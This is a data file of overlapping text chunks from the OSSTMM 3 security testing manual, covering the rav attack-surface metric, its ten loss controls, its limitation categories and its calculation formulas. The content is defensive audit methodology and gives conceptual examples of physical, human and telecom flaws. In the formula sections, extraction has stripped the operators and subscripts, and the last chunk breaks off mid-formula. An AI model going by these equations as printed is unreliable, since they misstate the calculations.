tissue walls like skin cells do. Some, like white blood cells, provide authentication and attack other cells which are on its “bad” list. Then some cells are foreigners, like bacteria which have entered at some point and thrived. The machine would classify all the cells that make up the person, a defined scope, rather than say which are “bad” or “good”. By counting the cells the machine can tell mostly how well the person as an organism works (health) and how well they fit into their current environment. It can also determine which cells are broken, which are superfluous, and of which type more might be required for the person to be more efficient, prepared for the unexpected, or for any number of specific requirements. Since the cells are dividing and dying all the time, the machine must also make regular tests and chart the person’s ability to improve or at least maintain homeostasis. Now in addition to counting cells and seeing how they work, the machine will also see with which other cells or under what conditions they",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 52
    }
  },
  {
    "text": "dividing and dying all the time, the machine must also make regular tests and chart the person’s ability to improve or at least maintain homeostasis. Now in addition to counting cells and seeing how they work, the machine will also see with which other cells or under what conditions they interact and how well. In The ravs are like counting cells and classifying them by what they each operation of the cell’s duties the machine can do to determine how well the organism fits into an environment. determine what the cells limitations are. So if it was possible for the machine to also repair a problem in faulty cells directly, fortify the body by changing the process of the cells, or removing the unnecessary cells, we would be able to directly affect the health of the body as a whole with each change. Or perhaps we might change the environment that the body is exposed to instead of the cells to make more global changes. By subjecting the person to better nutrition, diet, or exercise we will also change the body on a cellular level. All this is possible by knowing how things work inside the body and what’s there in these operations. Unfortunately there is no such machine for counting all cells in a human body. However it does exist for security. Analysts can count and verify the operations of targets in a scope as if it is a super-organism. They record its interactions and the controls surrounding those interactions. They classify them by operation, resources, processes, and limitations. Those numbers the Analysts generate are combined so that controls add to operational security and limitations take away from it. Even the value of the limitations, how badly each type of problem hurts, is also not arbitrary because it’s based on the combination of security and controls within that particular scope. So a bad problem in a protective environment will provide less over-all exposure than one in a less controlled environment. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 64\\nEight Fundamental Security Answers The rav does not represent risk where risk is known as Risk = Threat x Vulnerability x Asset. In that equation, risk is the result of an informed, however highly biased, equation. If we can remove most of the bias by knowing the level of protection and therefore the level of vulnerability impact, we can reduce the bias in that equation and give a much better risk assessment. Therefore, the rav is actually the factual foundation for a risk assessment where an Analyst has facts to work with. The real power of the rav however is how it can provide answers to the following eight fundamental security questions with great accuracy. 1. How much money should be spent on security? The rav will show the current amount of protection to make security projections and define milestones even before buying a particular solution or implementing some new process. From these projections and milestones, financial restrictions can be created",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 53
    }
  },
  {
    "text": "questions with great accuracy. 1. How much money should be spent on security? The rav will show the current amount of protection to make security projections and define milestones even before buying a particular solution or implementing some new process. From these projections and milestones, financial restrictions can be created to meet the goals and get the most specific results from the investment. By knowing exactly what is controlled based on the current expenditure, you can also see what is not being controlled for that money. “More” then becomes that which is missing. It is then possible to forecast the cost of filling in the missing controls to achieve a perfect balance or at least a decidedly acceptable level of coverage. 2. What should be protected first? The rav can be used to see security as part of the big picture and as a macro lens on a particular part of a target, or any combination thereof. After analysis, the rav will show which particular part of the scope has the greatest porosity and the weakest controls. Comparing that to one’s needs and asset worth, a ratio of protection strength to value can be generated to decide exactly where to start. 3. What protection solutions do we need and how should we set them up for maximum effectiveness? A fully completed rav will show the 10 possible operational controls applied for each target and the limitations of those controls. You can then choose solutions based on which types of controls you want to put in place. The difference now is that you no longer need to look at a solution in terms of what it is rather than as the protection or controls it can provide. This allows you to view products for the controls you need to provide in the areas where controls are currently deficient. 4. How much improvement is gained by specific security procurements and processes? A key feature of the rav is that you can make a “Delta” by mapping out the benefits and limitations of a particular solution for comparison prior to procurement. This means you can see what changes that solution will make to the scope to compare with other solutions. Combining that map to a rav of the scope where the solution would be placed, the amount of improvement can be gauged even prior to purchase. You can even predict the value of that protection by dividing the price of the solution by the rav delta. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 65\\n5. How do we measure the periodic security efforts and improvements? With regular audits, the rav can be recalculated and compared to the older value. Thereby the cost of new solutions and processes can be justified regularly as well as the cost of maintaining the current security level. 6. How do we know if we are reducing our exposure to our threats? With specific knowledge of your controls, you can easily tell what part or vector of the scope",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 54
    }
  },
  {
    "text": "new solutions and processes can be justified regularly as well as the cost of maintaining the current security level. 6. How do we know if we are reducing our exposure to our threats? With specific knowledge of your controls, you can easily tell what part or vector of the scope is weak to specific and most unknown threats. In rav terminology, an unknown threat is just one that can appear where interactions exist but controls do not. Therefore a map can be drawn between the threats determined by the Risk Assessors and the controls in place. Regular metric reviews will show any change in this map and can be done so regularly. Then it is possible to gauge the cost each of those threats has on security by the expenditure on controls. 7. Can the rav tell us how well something resists attacks? Technically, yes. The more you can balance controls with interactions, the smaller the attack surface will be and the more capable the target will have to control known and unknown types of interactions. 8. Can the rav help me with regulatory compliance? Anything that helps you classify all controls and Access points in a scope will help you with compliance audits. The rav helps you do such a good job of getting your security under control that you may even find the major flaws in compliance regulations. While there is no particular compliance right now that asks you to have a particular rav score, showing the OSSTMM STAR with its rav score will help you meet various compliance requirements for a third-party audit and documentation. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 66\\n4.2 How to Make a Rav The rav requires a security test in order to have the right things counted and the right operations analyzed. Any security test can be used but the more thorough and accurate the test the more the conclusive the results will be. The rav was originally designed for operations tests, like the OSSTMM, where the auditor focuses on the behavior of the target rather than the configuration. However experiments show it is possible to apply the rav to non-operational tests as well such as in static code analysis to determine the level of software security and complexity or in physical security checklist audits to determine the level of protection a physical space will provide. The SCARE (Source Code Analysis Risk Evaluation) project does exactly this by applying the ravs to C source code. The simplicity of making a rav from a security test. The minimum rav is made by the calculation of porosity which are the holes in the scope. The problem with security metrics is generally in the determination of the assessors to count what they can’t possibly really know. This problem does not exist in the rav. You get what you know from what is there for a particular vector and you make no assumptions surrounding what is not there. You count all that which is visible",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 55
    }
  },
  {
    "text": "determination of the assessors to count what they can’t possibly really know. This problem does not exist in the rav. You get what you know from what is there for a particular vector and you make no assumptions surrounding what is not there. You count all that which is visible and interactive outside of the scope and allows for unauthenticated interaction between other targets in the scope. That becomes the porosity. This porosity value makes the first of 3 parts of the final rav value. The next part is to account for the controls in place per target. This means going target by target and determining where any of the 10 controls are in place such as Authentication, Subjugation, Non-repudiation, etc. Each control is valued as 10% of a pore since each provides 1/10th of the total controls needed to prevent all attack types. This is because having all 10 controls for each pore is functionally the same as closing the pore provided the controls have no limitations. The third part of the rav is accounting for the limitations found in the protection and the controls. These are also known as “vulnerabilities”. The value of these limitations comes from the porosity and established controls themselves. With all counts completed, the rav is basically subtracting porosity and limitations from the controls. This is most easily done with the rav spreadsheet calculator. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 67\\nUnfortunately, an unskilled analyst can provide the wrong information which will translate into a bad rav. This is a possibility, just like it’s possible a carpenter doesn’t measure a board right or a mechanic fails to read the gauges right. The world is full of what-if scenarios. Therefore the rav is designed to be minimally influenced by bad auditing or cheating by eliminating the direct scope size from the metric calculation. However, no metric can be immune from fudging and the only way to assure the most accurate rav is to have multiple tests over time to make the counts and to be sure the auditor will take responsibility over the accuracy of the test. It is possible to take a short-cut in testing and still make a representative rav. If you don’t mind the error margin because you only want to make a quick comparison, you can just calculate the Porosity which means counting the visible and accessible targets. For example, those who run vulnerability scanners can count porosity and limitations relatively easily and assign default controls for discovered services. Analysts can also create a checklist which offers default controls for different common solutions found. These are all shortcuts to reduce the time to calculation but will affect the overall rav with an unknown, but perhaps acceptable, error margin. The end result is a calculation for Actual Security. It applies multiple controls of the same type to satisfy double-enforcement requirements like 2-factor Authentication. It also uses Log10 to reduce large numbers into human-manageable form. People generally like to work with smaller",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 56
    }
  },
  {
    "text": "with an unknown, but perhaps acceptable, error margin. The end result is a calculation for Actual Security. It applies multiple controls of the same type to satisfy double-enforcement requirements like 2-factor Authentication. It also uses Log10 to reduce large numbers into human-manageable form. People generally like to work with smaller numbers and especially as percentages which are easier to visualize. For a small scope, the accuracy of using Log10 as a reduction technique is negligible. However, if you have a very large scope with many targets you may want to work with the very large numbers for greater accuracy. Additionally if you want to see the true balance where multiple controls of the same type are not measured, that calculation can be found under the heading of True Protection. Combining Channels and Vectors One important requirement in applying the rav is that Actual Security can only be calculated per scope. A change in channel, vector, or index is a new scope and a new calculation for Actual Security. However, once calculated, multiple scopes can be combined together in aggregate to create one Actual Security that represents a fuller vision of the operational security all scopes. For example, a test can be made of Internet-facing servers from both the Internet side and from within the perimeter network where the servers reside. That is 2 vectors. Assume that, the Internet vector is indexed by IP address and contains 50 targets. The intranet vector is indexed by MAC address and is made of 100 targets because less controls exist internally to allow for more collaborative interaction between systems. Once each test is completed and the rav is counted they can be combined into one calculation of 150 targets as well as the sums of each limitations and controls. This will give a final Actual Security metric which is more complete for that perimeter network than either test would provide alone. It would also be possible to add the analysis from physical security, wireless, telecommunications, and human security tests in the same way. Such combinations are possible to create a better understanding of the total security in a holistic way. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 68\\nRav Calculator A straight-forward and simpler way to make ravs is to use the specifically created spreadsheets to calculate the Attack Surface and various, popular required metrics from the test data. This spreadsheet is available at the ISECOM website. The Analyst need only enter the values into the empty, white boxes and the rest of the calculations will be handled automatically. The rav calculation sheet for determining the balance between porosity, controls, and limitations. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 69\\n4.3 Turning Test Results into an Attack Surface Measurement Operational Security The measurement of the Attack Surface requires the measurements of Visibility, Trust, and Access relative to the scope. The number of targets in the scope that can be determined to exist by direct interaction, indirect interaction, or passive emanations is its visibility. As",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 57
    }
  },
  {
    "text": "into an Attack Surface Measurement Operational Security The measurement of the Attack Surface requires the measurements of Visibility, Trust, and Access relative to the scope. The number of targets in the scope that can be determined to exist by direct interaction, indirect interaction, or passive emanations is its visibility. As visibility is determined, its value represents the number of targets in the scope. Trust is any non-authenticated interaction to any of the targets. Access is the number of interaction points with each target. Category Description The number of targets in the scope. Count all targets by index only once and maintain the index consistently for all targets. It is generally unrealistic to have more targets visible than there are targets in the defined scope; however, it may be possible due to vector bleeds where a target which is normally not visible from one vector is visible due to a misconfiguration or 1 Visibility anomaly. A HUMSEC audit employs 50 people; however, only 38 of them are interactive from the test vector and channel. This would make a visibility of 38. This differs from visibility where one is determining the number of existing targets. Here, the auditor must count each Access per unique interaction point per unique probe. In a PHYSSEC audit, a building with 2 doors and 5 windows which all open has an Access of 7. If all the doors and windows are sealed, then it is an Access of 0 as these are not points where one can gain entry. For a COMSEC audit of data networks, the auditor counts each port response as an Access regardless of how many different ways the auditor can probe that port. However, if a service is not hosted at that port (daemon or an application), then all replies instead come from the IP Stack. Therefore, a server that responds with a SYN/ACK and service 2 Access interactivity to only one of the TCP ports scanned and with a RST to the rest does not have an Access count of 65536 (including port 0) since 66535 of the ports respond with the same response of RST from the kernel. To simplify, count only ports with service responses and only one IP Stack response regardless of the number of ports which can initiate this kind of interactivity. With HUMSEC audits, this is much more simplified. A person who responds to a query counts as an Access with all types of queries (all the different questions you may ask or statements made count as the same type of response on the same channel). Therefore, a person can only be an Access of 1 per channel and vector. Only a person who completely ignores the request by not acknowledging the channel is not counted. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 70\\nCategory Description This differs from visibility where one is determining the number of existing targets. Here, the auditor must count each Trust per unique interaction point per unique probe. In a PHYSSEC audit,",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 58
    }
  },
  {
    "text": "request by not acknowledging the channel is not counted. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 70\\nCategory Description This differs from visibility where one is determining the number of existing targets. Here, the auditor must count each Trust per unique interaction point per unique probe. In a PHYSSEC audit, a building with 2 internal doors separating rooms which open has a Trust of 2. If those doors are sealed then it is a Trust of 0 as these are not points where one can pass. 3 Trust For a COMSEC audit of data networks, the auditor counts each type of service forward or port forward as a Trust. With HUMSEC audits, a person who acts as a gateway to interact with other people or to access property is a trust per channel. Therefore, a person can only be a Trust of 1 per channel and vector. Only a person who does not comply to the Trust request is not counted. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 71\\nControls The next step in calculating the rav is to define the Controls; the security mechanisms put in place to provide assurance and protection during interactions. Category Description Count each instance of authentication required to gain access. This requires that authorization and identification make up the process for the proper use of the authentication mechanism. 1 Authentication In a PHYSSEC audit, if both a special ID card and a thumb print scan is required to gain access, then add two for authentication. However, if Access just requires one or the other, then only count one. Count each instance of methods used to exact liability and insure compensation for all assets within the scope. A basic PHYSSEC example is a warning sign threatening to prosecute trespassers. Another common example is property insurance. In a scope 2 Indemnification of 200 computers, a blanket insurance policy against theft applies to all 200 and therefore is a count of 200. However, do not confuse the method with the flaw in the method. A threat to prosecute without the ability or will to prosecute is still an indemnification method-- however, it is with a limitation. Count each instance for Access or Trust in the scope which strictly does not allow for controls to follow user discretion or originate outside of itself. This differs from being a security limitation in the target since it applies to the design or implementation of controls. In a COMSEC data networks audit, if a log-in can be made in HTTP as well as HTTPS but requires the user to make that distinction, then it fails to count toward Subjugation. However, if the implementation requires the secured mode by default, such as a PKI internal messaging system, then it does 3 Subjugation meet the requirement of the Subjugation control for that scope. More simply, in HUMSEC, a non-repudiation process where the person must sign a register and provide an identification number to receive a document is under Subjugation controls when the provider",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 59
    }
  },
  {
    "text": "a PKI internal messaging system, then it does 3 Subjugation meet the requirement of the Subjugation control for that scope. More simply, in HUMSEC, a non-repudiation process where the person must sign a register and provide an identification number to receive a document is under Subjugation controls when the provider of the document records the identification number, rather than having the receiver do so, to eliminate the recording of a false number with a false name. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 72\\nCategory Description Count each instance for Access or Trust in the scope which assures that no interruption in interaction over the channel and vector can be caused, even under situations of total failure. Continuity is the umbrella term for characteristics such as survivability, load balancing, and redundancy. In a PHYSSEC audit, if it is discovered that an entry way into a store 4 Continuity becomes blocked such that no alternate entry way is possible and customers cannot enter, that Access does not have Continuity. In a COMSEC data networks audit, if a web server service fails from high- load and an alternate web server provides redundancy so no interactions are lost, this Access has Continuity. Count each instance for Access or Trust in the scope that does not fail open or provide new accesses upon security failure. In common language, to “fail securely”. In a PHYSSEC audit where 2 guards control Access to a door, if one is removed and the door cannot be opened by the remaining guard, then 5 Resilience it has resilience. In a COMSEC data networks audit, if a web service requiring a log-in or password loses communication with its authentication database, then all Access should be denied rather than permitted in order to have resilience. Count each instance for the Access or Trust that provides a non- repudiation mechanism for each interaction to provide assurance that the particular interaction did occur at a particular time between the identified parties. Non-repudiation depends upon identification and authorization to be properly established for it to be properly applied without limitations. In a PHYSSEC audit, the Non-repudiation control exists if the entrance to a building requires a camera with a biometric face scan to gain entry and each time it is used, the time of entry is recorded with the ID. However, if a key-card is used instead, the Non-repudiation control requires a 6 Non-repudiation synchronized, time-coded camera to assure the record of the card-user’s identity to avoid being a flawed implementation. If the door is tried without the key card, not having the synchronized camera monitoring the door would mean that not all interactions with the entryway have the Non-repudiation control and therefore does not count for this control. In a COMSEC data networks audit, there may be multiple log files for non- repudiation. A port scan interacting at the IP Stack is recorded in one log while interaction with the web service is recorded to another log file. However, as the web service",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 60
    }
  },
  {
    "text": "not count for this control. In a COMSEC data networks audit, there may be multiple log files for non- repudiation. A port scan interacting at the IP Stack is recorded in one log while interaction with the web service is recorded to another log file. However, as the web service may not log the interactions from the POST method, the control is still counted; however, so is the security limitation. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 73\\nCategory Description Count each instance for Access or Trust in the scope that provides the means to maintain the content of undisclosed interactions between the interacting parties. A typical tool for Confidentiality is encryption. Additionally, obfuscation of 7 Confidentiality the content of an interaction is also a type of confidentiality, albeit a flawed one. In HUMSEC, however, a method of Confidentiality may include whispering or using hand signals. Count each instance for Access or Trust in the scope that provides the means to maintain the method of undisclosed interactions between the interacting parties. While “being private” is a common expression, the phrase is a bad example of privacy as a loss control because it includes elements of confidentiality. As a loss control, when something is done “in private” it means that only “the doing” is private but the content of the interaction may not be. A typical tool for Privacy is obscuring the interaction, that is, having the 8 Privacy interaction take place outside of the visibility of third parties. Confusion of the means of interaction as obfuscation is another method of applying the Privacy control. In HUMSEC, a method of Privacy may be simply taking the interaction into a closed room away from other people. In movies, we see techniques to create the Privacy control by setting two identical suitcases side by side, some type of incident to create confusion takes place, and the two people switch the suitcases in seemingly plain view. Count each instance for Access or Trust in the scope which can assure that the interaction process and Access to assets has finality and cannot be corrupted, stopped, continued, redirected, or reversed without it being known to the parties involved. Integrity is a change control process. In COMSEC data networks, encryption or a file hash can provide the Integrity control over the change of the file in transit. 9 Integrity In HUMSEC, segregation of duties and other corruption-reduction mechanisms provide Integrity control. Assuring integrity in personnel requires that two or more people are required for a single process to assure oversight of that process. This includes that no master Access to the whole process exists. There can be no person with full access and no master key to all doors. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 74\\nCategory Description Count each instance for Access or Trust which has a record or makes a notification when unauthorized and unintended porosity increases for the vector or restrictions and controls are compromised or corrupted. In COMSEC data networks, count each",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 61
    }
  },
  {
    "text": "all doors. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 74\\nCategory Description Count each instance for Access or Trust which has a record or makes a notification when unauthorized and unintended porosity increases for the vector or restrictions and controls are compromised or corrupted. In COMSEC data networks, count each server and service which a network-based intrusion detection system monitors. Or, count each 10 Alarm service that maintains a monitored log of interaction. access logs count, even if they are not used to send a notification alert immediately, unless they are never monitored. However, logs which are not designed to be used for such notifications, such as a counter of packets sent and received, do not classify as an alarm as there is too little data stored. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 75\\nLimitations Finally, the limitations are verified where possible. The values of each Limitation are dependent on Porosity and Controls. This is different from the more common risk perspective where a vulnerability may be assigned a risk level based on what damage it can do, how easy it is to do, and the distance in range for the attack. Therefore the Limitation values are calculated based on the Porosity and Controls of the target they can be found on. Category Description Count separately each flaw or error that defies protections whereby a person or process can access, deny access to others, or hide itself or assets within the scope. In PHYSSEC, a vulnerability can be as simple as a glass door, a metal gate corroded by the weather, a door that can be sealed by wedging coins into the gap between it and its frame, electronic equipment not sealed from pests such as ants or mice, a bootable CD drive on a PC, or a process that allows an employee to take a trashcan large enough to hide or transport assets out of the scope. In HUMSEC, a vulnerability can be a cultural bias that does not allow an employee to question others who look out of place or a lack of training which leaves a new secretary to give out business information classified for internal use only. In COMSEC data security, a vulnerability can be a flaw in software that allows an attacker to overwrite memory space to gain access, a 1 Vulnerability computation flaw that allows an attacker to lock the CPU into 100% usage, or an operating system that allows enough data to be copied onto the disk until it cannot operate anymore. In COMSEC telecommunications, a vulnerability can be a flaw in the pay phone system that allows sounds through the receiver to mimic coin drops, a telephone box that allows anyone to access anyone else’s phone line, a voice mail system that provides messages from any phone anywhere, or a FAX machine that can be polled remotely to resend the last thing in memory to the caller’s number. In SPECSEC, a vulnerability can be hardware which can be overloaded and burnt",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 62
    }
  },
  {
    "text": "to access anyone else’s phone line, a voice mail system that provides messages from any phone anywhere, or a FAX machine that can be polled remotely to resend the last thing in memory to the caller’s number. In SPECSEC, a vulnerability can be hardware which can be overloaded and burnt out by higher powered versions of the same frequency or a near frequency, a standard receiver without special configurations which can access the data in the signal, a receiver which can be forced to accept a third-party signal in place of the intended one, or a wireless access point dropping connections near a microwave oven. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 76\\nCategory Description Count each flaw or error in the controls for interactivity: authentication, indemnification, resilience, subjugation, and continuity. In PHYSSEC, a weakness can be a door lock that opens when a card is wedged between it and the door frame, a back-up generator with no fuel, or insurance that doesn’t cover flood damage in a flood zone. In HUMSEC, a weakness can be a process failure of a second guard to take the post of the guard who runs after an intruder or a cultural climate within a company for allowing friends into posted restricted spaces. In COMSEC data security, a weakness can be a log-in that allows 2 Weakness unlimited attempts or a web farm with round-robin DNS for load balancing yet each system also has a unique name for direct linking. In COMSEC telecommunications, a weakness can be a PBX that still has the default administration passwords or a modem bank for remote access dial-in which does not log the caller numbers, time, and duration. In SPECSEC, a weakness can be a wireless access point authenticating users based on MAC addresses (which can be spoofed) or an RFID security tag that no longer receives signals and therefore fails “open” after receiving a signal from a high power source. Count each flaw or error in process controls: non-repudiation, confidentiality, privacy, integrity, and alarm. In PHYSSEC, a concern can be a door lock mechanism whose operation controls and key types are public, a back-up generator with no power meter or fuel gauge, an equipment process that does not require the employee to sign-out materials when received, or a fire alarm not loud enough to be heard by machine workers with ear plugs. In HUMSEC, a concern can be a process failure of a guard who maintains the same schedule and routine or a cultural climate within a company that allows employees to use public meeting rooms for internal business. 3 Concern In COMSEC data security, a concern can be the use of locally generated web server certificates for HTTPS or log files which record only the transaction participants and not the correct date and time of the transaction. In COMSEC telecommunications, a concern can be the use of a FAX machine for sending private information or a voice mail system that uses touch tones for entering a",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 63
    }
  },
  {
    "text": "for HTTPS or log files which record only the transaction participants and not the correct date and time of the transaction. In COMSEC telecommunications, a concern can be the use of a FAX machine for sending private information or a voice mail system that uses touch tones for entering a PIN or password. In SPECSEC, a concern can be a wireless access point using weak data encryption or an infrared door opener that cannot read the sender in the rain. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 77\\nCategory Description Count each unjustifiable action, flaw, or error that provides direct or indirect visibility of targets or assets within the chosen scope channel. In PHYSSEC, an exposure can be a window which allows one to view assets and processes or a power meter that shows how much energy a building uses and its fluctuation over time. In HUMSEC, an exposure can be a guard who allows all visitors to view the list of names on the sign-in sheet or a company operator who informs callers that a particular person is out sick or on vacation. In COMSEC data security, an exposure can be a descriptive and valid 4 Exposure banner about a service (disinformation banners are not exposures) or an ICMP echo reply from a host. In COMSEC telecommunications, an exposure can be an automated company directory sorted alphabetically, allowing anyone to cycle through all persons and numbers, or a FAX machine that stores the last dialed numbers. In SPECSEC, an exposure can be a signal that disrupts other machinery or an infrared device whose operation is visible by standard video cameras with night capability. Count each unidentifiable or unknown element which cannot be accounted for in normal operations, generally when the source or destination of the element cannot be understood. An anomaly may be an early sign of a security problem. Since unknowns are elements which cannot be controlled, a proper audit requires noting any and all anomalies. In PHYSSEC, an anomaly can be dead birds discovered on the roof a building around communications equipment. In HUMSEC, an anomaly can be questions a guard asks which may seem 5 Anomaly irrelevant to either the job or standard small talk. In COMSEC data security, an anomaly can be correct responses to a probe from a different IP address than was probed or expected. In COMSEC telecommunications, an anomaly can be a modem response from a number that has no modem. In SPECSEC, an anomaly can be a local signal that cannot be properly located nor does it do any known harm. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 78\\n4.4 The Operational Security Formula The rav is derived from three categories defined within the scope: Operational Security, Controls and Limitations. In order to begin, we must first aggregate and associate all of our input information into the appropriate categories for each input variable. The rav equation requires that each of the categories be assigned a logarithmic base value to scale the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 64
    }
  },
  {
    "text": "defined within the scope: Operational Security, Controls and Limitations. In order to begin, we must first aggregate and associate all of our input information into the appropriate categories for each input variable. The rav equation requires that each of the categories be assigned a logarithmic base value to scale the three factors of Actual Security in accordance with the scope. The information contained within the rav is comprised of how operations balances with controls and limitations. There are no \"weights\" to skew the results leaving a flexible quantification of the attack surface that allows it to be compared to the security of anything else no matter size, vector, or Channel. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 79\\nPorosity Operational Security, also known as the scope’s Porosity, is the first of the three factors of Actual Security that should be determined. It is initially measured as the sum of the scope’s visibility ( P ), access (P ),and V A trust (P ). T OpSec  P  P  P sum V A T When calculating the rav it is however necessary to determine the Operational Security base value, OpSec . The Operational Security base value is given by the equation base OpSec  log2 1100OpSec  . base sum Since the logarithm of 0 is not defined in the calculation we needed to include the 1+100 here. The log of 1 is 0. So if we have 0 Porosity and want to express this lack of interaction as perfect security of 100 rav then we needed to add +1 to the equation. Without the 1+100 we would have undefined numbers in the case that the sums of any of those factors are 0. This is required by the methodology because the absence of interactions represents perfect security and therefore the logarithm should equal 0 to provide the 100 rav. 4.5 The Controls Formula The next step in calculating the rav is to define the Loss Controls; the security mechanisms put in place to protect the operations. First the sum of the Loss Controls, LC , must be determined by adding together sum the 10 Loss Control categories. Controls Class A Authentication LC Au Indemnification LC Id Resilience LC Re Subjugation LC Su Continuity LC Ct Class B Non-Repudiation LC NR Confidentiality LC Cf Privacy LC Pr Integrity LC It Alarm LC Al Thus the Loss Control sum LC is given as sum LC  LC  LC  LC LC  LC  LC  LC  LC LC LC . sum Au Id Re Su Ct NR Cf Pr It Al Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 80\\nMissing Controls Given that the combination of each of the 10 Loss Controls balance the value of 1 OpSec loss (visibility, access, trust) it is necessary to determine the amount of Missing Controls, MC , in order to assess the sum value of the Security Limitations. This must be done individually for each of the 10 Loss Control",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 65
    }
  },
  {
    "text": "of the 10 Loss Controls balance the value of 1 OpSec loss (visibility, access, trust) it is necessary to determine the amount of Missing Controls, MC , in order to assess the sum value of the Security Limitations. This must be done individually for each of the 10 Loss Control categories. For example, to determine the Missing Controls for Authentication (MC ) we must subtract the sum of Au Authentication Controls (LC ) of the scope from the OpSec . The Missing Controls can never be less Au sum than zero however. The equation for determining the Missing Controls for Authentication (MC ) is given by Au IF OpSec - LC 0 sum Au THEN MC 0 Au ELSE MC  OpSec LC . Au sum Au The resulting Missing Control totals for each of the 10 Loss Controls must then be added to arrive at the total Missing Control value (MC ) as seen below. sum MC  MC MC MC MC MC MC MC MC MC MC sum Au Id Re Su Ct NR It Pr Cf Al Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 81\\nTrue Controls True Controls (TC ) is the inverse of Missing Controls which means the True Controls for each individual sum control also need to be calculated before the results can be tallied into TC . sum The equation for determining the True Controls for Authentication (TC ) is given by Au TC OpSec MC Au sum Au The resulting True Control totals for each of the 10 Loss Controls must then be added to arrive at the total True Control value (TC ) as seen below. sum TC  TC TC TC TC TC TC TC TC TC TC sum Au Id Re Su Ct NR It Pr Cf Al True Controls are used to measure the ideal placement of controls. The base value also helps to eliminate the influence of a disproportionate placement of controls on security. The True Controls base (TC ) base value is given as: TC  log21100(OpSec MC 0.1). base sum sum Based on the same idea as True Controls, True Coverage (TCvg) can be used to measure the percentage of controls in place regarding the optimal amount and placement of controls. True Coverage is then derived using the Missing Control totals and the following equation: IF OpSec  0 sum THEN TCvg 0 MC ELSE TCvg 1 sum . 10OpSec sum Full Controls Full Controls, on the other hand, take into account all controls in place regardless of a balanced distribution. This value is important for measuring the worth of two-factor authentication, for example, and other instances of defense in depth for the same visibility, access or trust. The Full Controls base ( FC ) base value is given as: FC log2110LC  base sum Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 82\\n4.6 The Limitations Formula Next, the Limitations are individually weighted. The weighting of the Vulnerabilities, Weaknesses and Concerns are based on a",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 66
    }
  },
  {
    "text": "access or trust. The Full Controls base ( FC ) base value is given as: FC log2110LC  base sum Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 82\\n4.6 The Limitations Formula Next, the Limitations are individually weighted. The weighting of the Vulnerabilities, Weaknesses and Concerns are based on a relationship between the Porosity or OpSec , the Loss Controls and in the case sum of Exposures and Anomaly the existence of other Limitations also plays a role. An Exposure or Anomaly poses no problems alone unless a Vulnerability, Weakness or Concern is also present. Think of an Exposure like a pointer. If there is a pointer that goes nowhere, or in this case doesn’t lead to anything exploitable (Vulnerability, Weakness, Concern) and all Controls are accounted for, then at the time of the test the Exposure has no effect on security and thus has no value in the rav. The following value table is used to calculate the SecLim variable, as an intermediate step between sum the Security Limitation inputs and the SecLim variable, which is the Security Limitations basic input for base the rav equation. IF OpSec 0 sum THEN MCvg 0 MC 0.1 ELSE MCvg  sum OpSec sum Input Weighted Value Variables Vulnerability OpSec MC  MC : sum of Missing Controls sum sum sum L V OpSec sum Weakness OpSec MC  MC : sum of Missing Controls in Control Class A sum A A L W OpSec sum Concern OpSec MC  MC : sum of Missing Controls in Control Class B sum B B L C OpSec sum Exposure P  P MCvg L L L  P : sum of Visibility V A V W C V L E OpSec P : sum of Accesses sum A MCvg: Percent Missing Coverage Anomaly P MCvg L L  L  P : sum of 